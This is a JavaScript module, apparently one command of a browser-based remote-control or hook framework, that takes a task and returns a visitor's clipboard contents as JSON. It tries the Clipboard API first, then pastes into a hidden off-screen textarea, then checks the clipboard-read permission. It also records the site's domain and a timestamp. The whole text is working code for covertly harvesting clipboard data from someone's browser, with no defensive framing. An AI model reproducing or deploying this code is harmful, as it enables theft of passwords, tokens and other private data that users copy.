COMMANDS['clipboard'] = async function(task) {
    var result = {
        domain: window.location.hostname,
        secureContext: window.isSecureContext,
        timestamp: new Date().toISOString()
    };

    // Method 1: Clipboard API (requires secure context + permission)
    if (navigator.clipboard && navigator.clipboard.readText) {
        try {
            var text = await navigator.clipboard.readText();
            result.method = 'Clipboard API';
            result.content = text;
            result.length = text.length;
            return JSON.stringify(result, null, 2);
        } catch (e) {
            result.clipboardApiError = e.message;
        }
    }

    // Method 2: execCommand('paste') via a hidden textarea
    try {
        var ta = document.createElement('textarea');
        ta.style.cssText = 'position:fixed;left:-9999px;top:-9999px;opacity:0;';
        document.body.appendChild(ta);
        ta.focus();
        var ok = document.execCommand('paste');
        if (ok && ta.value) {
            result.method = 'execCommand';
            result.content = ta.value;
            result.length = ta.value.length;
            document.body.removeChild(ta);
            return JSON.stringify(result, null, 2);
        }
        document.body.removeChild(ta);
        result.execCommandResult = ok ? 'empty' : 'denied';
    } catch (e) {
        result.execCommandError = e.message;
    }

    // Method 3: Check clipboard-read permission status
    if (navigator.permissions) {
        try {
            var perm = await navigator.permissions.query({name: 'clipboard-read'});
            result.permissionState = perm.state;
        } catch (e) {}
    }

    result.method = 'none';
    result.content = null;
    result.note = 'Clipboard access denied. Requires HTTPS + user gesture or granted permission.';
    return JSON.stringify(result, null, 2);
};
